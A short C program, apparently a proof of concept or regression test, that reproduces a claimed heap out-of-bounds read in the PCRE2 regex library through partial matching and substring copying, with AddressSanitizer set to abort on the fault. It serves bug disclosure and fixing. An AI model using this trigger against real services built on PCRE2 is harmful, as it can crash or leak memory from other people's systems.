#define PCRE2_CODE_UNIT_WIDTH 8

/* Heap buffer overflow (out-of-bounds read) reached through the public PCRE2
 * API, using only documented, in-contract calls: a partial match made with
 * PCRE2_COPY_MATCHED_SUBJECT from a non-zero start offset, followed by
 * extraction of the partially matched string with pcre2_substring_copy_bynumber().
 *
 * This is the standard chunked/continuation workflow described in the
 * pcre2partial documentation: match a chunk, keep the unmatched tail, and
 * carry on when more data arrives.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcre2.h>

/* Ask AddressSanitizer to abort (SIGABRT) on the first error it reports,
rather than merely exiting, so that a memory fault is unmistakable. */

#if defined(__SANITIZE_ADDRESS__)
#define PROBE_HAVE_ASAN 1
#elif defined(__has_feature)
#if __has_feature(address_sanitizer)
#define PROBE_HAVE_ASAN 1
#endif
#endif

#ifdef PROBE_HAVE_ASAN
const char *__asan_default_options(void);
const char *__asan_default_options(void) { return "abort_on_error=1"; }
#endif

#define SUBJECT_LEN 300
#define START_OFFSET 280

int main(void)
{
  int errorcode, rc;
  PCRE2_SIZE erroroffset, size;
  pcre2_code *code;
  pcre2_match_data *match_data;
  PCRE2_UCHAR *subject;
  PCRE2_UCHAR buffer[64];

  code = pcre2_compile((PCRE2_SPTR)"(a+b)", PCRE2_ZERO_TERMINATED, 0,
                       &errorcode, &erroroffset, NULL);
  if (code == NULL)
  {
    printf("pcre2_compile failed: %d\n", errorcode);
    return 1;
  }

  match_data = pcre2_match_data_create_from_pattern(code, NULL);
  if (match_data == NULL)
  {
    printf("pcre2_match_data_create_from_pattern failed\n");
    return 1;
  }

  /* A chunk whose tail is an incomplete match: 20 'a's at the end, with the
  matching started well into the chunk. */

  subject = (PCRE2_UCHAR *)malloc(SUBJECT_LEN);
  if (subject == NULL)
    return 1;
  memset(subject, 'x', START_OFFSET);
  memset(subject + START_OFFSET, 'a', SUBJECT_LEN - START_OFFSET);

  rc = pcre2_match(code, subject, SUBJECT_LEN, START_OFFSET,
                   PCRE2_PARTIAL_HARD | PCRE2_COPY_MATCHED_SUBJECT,
                   match_data, NULL);
  if (rc != PCRE2_ERROR_PARTIAL)
  {
    printf("pcre2_match rc=%d (expected PCRE2_ERROR_PARTIAL)\n", rc);
    return 1;
  }
  printf("partial ovector=[%lu,%lu]\n",
         (unsigned long)pcre2_get_ovector_pointer(match_data)[0],
         (unsigned long)pcre2_get_ovector_pointer(match_data)[1]);

  /* Fetch the partially matched string. */

  size = sizeof(buffer);
  rc = pcre2_substring_copy_bynumber(match_data, 0, buffer, &size);
  printf("pcre2_substring_copy_bynumber rc=%d size=%lu\n", rc,
         (unsigned long)size);

  free(subject);
  pcre2_match_data_free(match_data);
  pcre2_code_free(code);
  return 0;
}
